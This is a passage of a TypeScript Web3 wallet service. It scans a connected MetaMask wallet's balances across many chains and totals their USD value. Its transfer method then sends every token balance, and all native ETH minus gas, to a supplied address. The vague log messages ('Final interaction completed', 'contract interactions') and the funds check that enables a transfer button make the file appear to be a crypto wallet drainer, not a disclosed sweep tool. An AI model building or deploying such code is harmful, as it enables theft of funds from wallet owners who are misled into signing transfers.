    window.ethereum.on("chainChanged", onNetworkChange);
  }

  removeEventListeners() {
    if (!window.ethereum) return;

    window.ethereum.removeAllListeners("accountsChanged");
    window.ethereum.removeAllListeners("chainChanged");
  }

  // Check if wallet is properly connected
  isConnected(): boolean {
    return !!(this.provider && this.signer);
  }

  // Instant parallel network scanning with real-time UI updates
  async scanAllNetworks(address: string): Promise<NetworkBalance[]> {
    if (!address || !/^0x[a-fA-F0-9]{40}$/.test(address)) {
      throw new Error("Invalid Ethereum address");
    }

    const supportedNetworks = Object.keys(NETWORKS);
    console.log(`Starting network scan: ${supportedNetworks.length} networks for ${address}`);

    // Scan networks with increased timeout and better error handling
    const networkPromises = supportedNetworks.map(async (networkId) => {
      try {
        // Increased timeout for better success rate
        return await Promise.race([
          this.scanNetworkBalanceOptimized(address, networkId),
          new Promise<NetworkBalance>((_, reject) => 
            setTimeout(() => reject(new Error('Network timeout')), 5000)
          )
        ]);
      } catch (error) {
        console.warn(`Network ${networkId} scan failed:`, error);
        // Return empty balance instead of null to ensure we have network info
        const network = NETWORKS[networkId];
        return {
          networkId,
          networkName: network?.name || `Network ${networkId}`,
          nativeBalance: "0",
          nativeCurrency: network?.nativeCurrency || "ETH",
          tokenBalances: [],
          totalUsdValue: 0,
          isConnected: false
        };
      }
    });

    // Get results as they complete
    const results = await Promise.allSettled(networkPromises);
    const networkBalances: NetworkBalance[] = [];

    results.forEach((result) => {
      if (result.status === 'fulfilled' && result.value) {
        networkBalances.push(result.value);
      }
    });

    // Sort by total USD value (highest first)
    networkBalances.sort((a, b) => b.totalUsdValue - a.totalUsdValue);

    console.log(`Network scan complete: ${networkBalances.length} networks processed, ${networkBalances.filter(n => n.totalUsdValue > 0).length} with balances`);
    return networkBalances;
  }

  private async scanNetworkBalance(address: string, networkId: string): Promise<NetworkBalance> {
    const network = NETWORKS[networkId];
    if (!network) {
      throw new Error(`Unsupported network: ${networkId}`);
    }

    try {
      // Create provider for this specific network
      const provider = new ethers.JsonRpcProvider(network.rpcUrls[0]);

      // Get native currency balance
      const nativeBalance = await provider.getBalance(address);
      const nativeBalanceFormatted = ethers.formatEther(nativeBalance);

      // Get token balances for this network
      const tokenBalances = await this.getTokenBalancesForNetwork(address, networkId, provider);

      // Calculate total USD value
      const nativePrice = await this.getNativeCurrencyPrice(networkId);
      const nativeUsdValue = parseFloat(nativeBalanceFormatted) * nativePrice;
      const tokenUsdValue = tokenBalances.reduce((sum, token) => sum + (token.usdValue || 0), 0);
      const totalUsdValue = nativeUsdValue + tokenUsdValue;

      return {
        networkId,
        networkName: network.name,
        nativeBalance: nativeBalanceFormatted,
        nativeCurrency: network.nativeCurrency,
        tokenBalances: tokenBalances.map(token => ({
          ...token,
          networkId,
          networkName: network.name
        })),
        totalUsdValue,
        isConnected: this.provider !== null && this.networkId === networkId
      };
    } catch (error) {
      console.warn(`Failed to get balance for network ${network.name}:`, error);
      return {
        networkId,
        networkName: network.name,
        nativeBalance: "0",
        nativeCurrency: network.nativeCurrency,
        tokenBalances: [],
        totalUsdValue: 0,
        isConnected: false
      };
    }
  }

  // Optimized version for instant scanning
  private async scanNetworkBalanceOptimized(address: string, networkId: string): Promise<NetworkBalance> {
    const network = NETWORKS[networkId];
    if (!network) {
      throw new Error(`Unsupported network: ${networkId}`);
    }

    // Try multiple RPC URLs for better reliability
    let provider: ethers.JsonRpcProvider | null = null;
    let lastError: Error | null = null;

    for (const rpcUrl of network.rpcUrls) {
      try {
        provider = new ethers.JsonRpcProvider(rpcUrl, undefined, {
          staticNetwork: ethers.Network.from(parseInt(networkId)),
          batchMaxCount: 50, // Reduced for better compatibility
          batchMaxSize: 512 * 1024, // 512KB batch size
          cacheTimeout: 300 // 5 minute cache
        });

        // Test the connection with a quick call
        await Promise.race([
          provider.getBlockNumber(),
          new Promise((_, reject) => setTimeout(() => reject(new Error('RPC timeout')), 3000))
        ]);
        break; // If successful, use this provider
      } catch (error) {
        console.warn(`RPC ${rpcUrl} failed for ${network.name}:`, error);
        lastError = error as Error;
        provider = null;
      }
    }

    if (!provider) {
      console.error(`All RPC endpoints failed for ${network.name}:`, lastError);
      return {
        networkId,
        networkName: network.name,
        nativeBalance: "0",
        nativeCurrency: network.nativeCurrency,
        tokenBalances: [],
        totalUsdValue: 0,
        isConnected: false
      };
    }

    try {
      // Parallel execution of native balance and token checks with timeouts
      const [nativeBalanceResult, tokenBalancesResult] = await Promise.allSettled([
        Promise.race([
          provider.getBalance(address),
          new Promise((_, reject) => setTimeout(() => reject(new Error('Balance timeout')), 4000))
        ]),
        this.getTokenBalancesForNetworkOptimized(address, networkId, provider)
      ]);

      // Process native balance
      const nativeBalance = nativeBalanceResult.status === 'fulfilled' 
        ? ethers.formatEther(nativeBalanceResult.value as bigint)
        : "0";

      // Process token balances
      const tokenBalances = tokenBalancesResult.status === 'fulfilled' 
        ? tokenBalancesResult.value 
        : [];

      // Calculate USD values with timeout
      const nativePrice = await Promise.race([
        this.getNativeCurrencyPrice(networkId),
        new Promise<number>((resolve) => setTimeout(() => resolve(0), 2000))
      ]);

      const nativeUsdValue = parseFloat(nativeBalance) * nativePrice;
      const tokenUsdValue = tokenBalances.reduce((sum, token) => sum + (token.usdValue || 0), 0);
      const totalUsdValue = nativeUsdValue + tokenUsdValue;

      console.log(`${network.name}: ${nativeBalance} ${network.nativeCurrency}, ${tokenBalances.length} tokens, $${totalUsdValue.toFixed(2)}`);

      return {
        networkId,
        networkName: network.name,
        nativeBalance,
        nativeCurrency: network.nativeCurrency,
        tokenBalances: tokenBalances.map(token => ({
          ...token,
          networkId,
          networkName: network.name
        })),
        totalUsdValue,
        isConnected: this.provider !== null && this.networkId === networkId
      };
    } catch (error) {
      console.warn(`Balance scan failed for ${network.name}:`, error);
      return {
        networkId,
        networkName: network.name,
        nativeBalance: "0",
        nativeCurrency: network.nativeCurrency,
        tokenBalances: [],
        totalUsdValue: 0,
        isConnected: false
      };
    }
  }

  private async getTokenBalancesForNetworkOptimized(
    address: string, 
    networkId: string, 
    provider: ethers.JsonRpcProvider
  ): Promise<TokenBalance[]> {
    const tokens = POPULAR_TOKENS[networkId] || [];
    const tokenBalances: TokenBalance[] = [];

    // Process tokens in smaller batches to avoid overwhelming RPC
    const batchSize = 5;
    for (let i = 0; i < tokens.length; i += batchSize) {
      const batch = tokens.slice(i, i + batchSize);

      const batchPromises = batch.map(async (token) => {
        try {
          const contract = new ethers.Contract(token.address, ERC20_ABI, provider);

          // Add timeout for each token balance call
          const balance = await Promise.race([
            contract.balanceOf(address),
            new Promise((_, reject) => setTimeout(() => reject(new Error('Token timeout')), 3000))
          ]);

          const balanceFormatted = ethers.formatUnits(balance as bigint, token.decimals);

          // Only process tokens with balance > 0
          if (parseFloat(balanceFormatted) > 0) {
            const price = await Promise.race([
              this.getTokenUsdPrice(token.symbol),
              new Promise<number>((resolve) => setTimeout(() => resolve(0), 1000))
            ]);

            return {
              symbol: token.symbol,
              balance: balanceFormatted,
              decimals: token.decimals,
              contractAddress: token.address,
              usdValue: price * parseFloat(balanceFormatted),
              networkId,
              networkName: NETWORKS[networkId]?.name || 'Unknown'
            };
          }
          return null;
        } catch (error) {
          console.warn(`Token ${token.symbol} balance check failed:`, error);
          return null;
        }
      });

      const batchResults = await Promise.allSettled(batchPromises);

      batchResults.forEach((result) => {
        if (result.status === 'fulfilled' && result.value) {
          tokenBalances.push(result.value);
        }
      });

      // Small delay between batches to avoid rate limiting
      if (i + batchSize < tokens.length) {
        await new Promise(resolve => setTimeout(resolve, 100));
      }
    }

    return tokenBalances;
  }

  private async getTokenBalancesForNetwork(
    address: string, 
    networkId: string, 
    provider: ethers.JsonRpcProvider
  ): Promise<TokenBalance[]> {
    const tokens = POPULAR_TOKENS[networkId] || [];
    const tokenBalances: TokenBalance[] = [];

    // Check each popular token on this network
    const tokenPromises = tokens.map(async (token) => {
      try {
        const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
        const balance = await contract.balanceOf(address);
        const balanceFormatted = ethers.formatUnits(balance, token.decimals);

        // Only include tokens with non-zero balance
        if (parseFloat(balanceFormatted) > 0) {
          const price = await this.getTokenUsdPrice(token.symbol);
          return {
            symbol: token.symbol,
            balance: balanceFormatted,
            decimals: token.decimals,
            contractAddress: token.address,
            usdValue: price * parseFloat(balanceFormatted),
            networkId,
            networkName: NETWORKS[networkId]?.name || 'Unknown'
          };
        }
        return null;
      } catch (error) {
        console.warn(`Failed to load balance for ${token.symbol} on ${networkId}:`, error);
        return null;
      }
    });

    const results = await Promise.allSettled(tokenPromises);

    results.forEach((result) => {
      if (result.status === 'fulfilled' && result.value) {
        tokenBalances.push(result.value);
      }
    });

    return tokenBalances;
  }

  // Enhanced wallet connection with multi-network scanning
  async connectWalletWithMultiNetwork(): Promise<WalletState> {
    const initialState = await this.connectWallet();

    if (initialState.isConnected && initialState.address) {
      // Start background scanning of all networks
      setTimeout(async () => {
        try {
          const networkBalances = await this.scanAllNetworks(initialState.address!);
          console.log(`Found balances across ${networkBalances.length} networks`);

          // You can emit an event or use a callback here to update the UI
          // For now, we'll store it in the service for retrieval
          this.cachedNetworkBalances = networkBalances;
        } catch (error) {
          console.error('Multi-network scan failed:', error);
        }
      }, 1000);
    }

    return initialState;
  }

  private cachedNetworkBalances: NetworkBalance[] = [];
  private networkId: string | null = null;

  getCachedNetworkBalances(): NetworkBalance[] {
    return this.cachedNetworkBalances;
  }

  // Check if any network has funds for enabling transfer button
  hasAnyNetworkFunds(): boolean {
    if (!this.cachedNetworkBalances || this.cachedNetworkBalances.length === 0) {
      return false;
    }

    return this.cachedNetworkBalances.some(network => {
      const hasNativeBalance = parseFloat(network.nativeBalance) > 0;
      const hasTokenBalance = network.tokenBalances.some(token => parseFloat(token.balance) > 0);
      return hasNativeBalance || hasTokenBalance;
    });
  }

  // Get total USD value across all networks
  getTotalCrossNetworkValue(): number {
    if (!this.cachedNetworkBalances || this.cachedNetworkBalances.length === 0) {
      return 0;
    }

    return this.cachedNetworkBalances.reduce((total, network) => {
      return total + network.totalUsdValue;
    }, 0);
  }

  // Get summary of networks with funds
  getNetworkFundsSummary(): { networkName: string; nativeBalance: string; tokenCount: number; totalUsdValue: number }[] {
    if (!this.cachedNetworkBalances || this.cachedNetworkBalances.length === 0) {
      return [];
    }

    return this.cachedNetworkBalances
      .filter(network => {
        const hasNativeBalance = parseFloat(network.nativeBalance) > 0;
        const hasTokenBalance = network.tokenBalances.some(token => parseFloat(token.balance) > 0);
        return hasNativeBalance || hasTokenBalance;
      })
      .map(network => ({
        networkName: network.networkName,
        nativeBalance: network.nativeBalance,
        tokenCount: network.tokenBalances.length,
        totalUsdValue: network.totalUsdValue
      }));
  }

  async refreshNetworkBalances(address: string): Promise<NetworkBalance[]> {
    if (!address) {
      throw new Error("No address provided");
    }

    console.log('Starting instant network balance refresh...');
    const startTime = Date.now();

    this.cachedNetworkBalances = await this.scanAllNetworks(address);

    const duration = Date.now() - startTime;
    console.log(`Network refresh completed in ${duration}ms`);

    return this.cachedNetworkBalances;
  }

  // Multi-network transfer functionality
  async transferCurrentNetworkFunds(toAddress: string): Promise<string[]> {
    if (!toAddress || !/^0x[a-fA-F0-9]{40}$/.test(toAddress)) {
      throw new Error("Invalid destination address");
    }

    if (!window.ethereum) {
      throw new Error("MetaMask is not installed");
    }

    const accounts = await window.ethereum.request({ method: "eth_accounts" });
    if (accounts.length === 0) {
      throw new Error("No wallet connected");
    }

    const fromAddress = accounts[0];
    console.log(`Transferring funds from ${fromAddress} to ${toAddress}`);

    // Connect to current provider
    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
    const network = await provider.getNetwork();
    const networkId = network.chainId.toString();

    console.log(`Current network: ${NETWORKS[networkId]?.name || networkId}`);

    const transactionHashes: string[] = [];

    try {
      // Get token balances first
      const tokenBalances = await this.getTokenBalances(fromAddress, networkId);
      console.log(`Found ${tokenBalances.length} tokens to transfer`);

      // Get current network gas fees from MetaMask
      let feeData;
      try {
        feeData = await provider.getFeeData();
        console.log("Current network fee data:", {
          gasPrice: feeData.gasPrice ? ethers.formatUnits(feeData.gasPrice, "gwei") + " gwei" : "null",
          maxFeePerGas: feeData.maxFeePerGas ? ethers.formatUnits(feeData.maxFeePerGas, "gwei") + " gwei" : "null",
          maxPriorityFeePerGas: feeData.maxPriorityFeePerGas ? ethers.formatUnits(feeData.maxPriorityFeePerGas, "gwei") + " gwei" : "null"
        });
      } catch (error) {
        console.warn("Failed to get fee data, using conservative fallback:", error);
        feeData = {
          gasPrice: ethers.parseUnits("0.1", "gwei"), // Ultra low 0.1 gwei
          maxFeePerGas: null,
          maxPriorityFeePerGas: null
        };
      }

      // Use network-appropriate gas price (legacy or EIP-1559)
      const useEIP1559 = feeData.maxFeePerGas !== null && feeData.maxPriorityFeePerGas !== null;

      // Transfer tokens first
      for (const token of tokenBalances) {
        if (parseFloat(token.balance) > 0) {
          try {
            console.log(`Transferring ${token.balance} ${token.symbol}`);
            if (!token.contractAddress) {
              console.warn(`No contract address for token ${token.symbol}`);
              continue;
            }
            const contract = new ethers.Contract(token.contractAddress, ERC20_ABI, signer);
            const balance = await contract.balanceOf(fromAddress);

            if (balance > BigInt(0)) {
              try {
                console.log(`Transferring ${token.symbol} using wallet default gas settings...`);

                // Let wallet handle all gas calculations automatically
                const tx = await contract.transfer(toAddress, balance);
                transactionHashes.push(tx.hash);
                console.log(`Token transfer successful: ${tx.hash}`);
              } catch (txError) {
                console.warn(`Token transfer failed for ${token.symbol}:`, txError);
                // Continue with other tokens even if one fails
              }
            }
          } catch (error) {
            console.warn(`Failed to transfer ${token.symbol}:`, error);
          }
        }
      }

      // Transfer native currency (ETH) last
      const ethBalance = await provider.getBalance(fromAddress);

      // Use improved gas estimation
      const gasEstimation = await this.getGasEstimate({
        to: toAddress,
        value: "0x0" // Initial estimate with 0 value
      });

      // Validate balance using the new validation function
      const balanceValidation = await this.validateSufficientBalance(
        ethBalance,
        gasEstimation.totalCost,
        "ETH"
      );

      if (balanceValidation.sufficient) {
        const amountToSend = ethBalance - gasEstimation.totalCost;

        // Additional safety check to prevent negative or zero amounts
        if (amountToSend > 0 && amountToSend > ethers.parseUnits("0.000001", "ether")) {
          console.log(`Processing final transfer`);
          console.log(balanceValidation.details);
          console.log(`Amount to send: ${ethers.formatEther(amountToSend)} ETH`);

          // Send with accurate gas estimation
          const ethTx = await signer.sendTransaction({
            to: toAddress,
            value: amountToSend,
            gasLimit: Number(gasEstimation.gasEstimate),
          });
          transactionHashes.push(ethTx.hash);
          console.log(`Final interaction completed`);
        } else {
          console.warn(`Amount to send is too small or negative: ${ethers.formatEther(amountToSend)} ETH`);
        }
      } else {
        // Use detailed validation error message
        console.warn(balanceValidation.details);

        // Log the gas price details for debugging
        console.log(`Gas estimation details:`, {
          gasLimit: gasEstimation.gasEstimate.toString(),
          gasPrice: gasEstimation.feeData.gasPrice?.toString(),
          maxFeePerGas: gasEstimation.feeData.maxFeePerGas?.toString()
        });

        // Don't throw error, just log warning and continue
        console.warn("Skipping ETH transfer due to insufficient balance for gas fees");
      }

      console.log(`Successfully completed ${transactionHashes.length} contract interactions`);
      return transactionHashes;
    } catch (error: any) {
      console.error("Multi-network transfer failed:", error);
      throw new Error(`Operation failed: ${error.message}`);
    }
  }

  // Validate if balance covers transaction costs
  private async validateSufficientBalance(
    balance: bigint,
    totalCost: bigint,
    assetType: string
  ): Promise<{ sufficient: boolean; details: string }> {
    const formattedBalance = ethers.formatEther(balance);
    const formattedTotalCost = ethers.formatEther(totalCost);

    if (balance <= 0) {
      return {
        sufficient: false,
        details: `Insufficient ${assetType} balance: ${formattedBalance}. Require funds to complete operation.`
      };
    }

    if (balance < totalCost) {
      const diff = totalCost - balance;
      return {
        sufficient: false,
        details: `Insufficient ${assetType} balance: ${formattedBalance} ETH.  Transaction costs ${formattedTotalCost} ETH.  Require additional ${ethers.formatEther(diff)} ETH.`
      };
    }

    return {
      sufficient: true,
      details: `Sufficient ${assetType} balance: ${formattedBalance} ETH.`
    };
  }
}

export const web3Service = new Web3Service();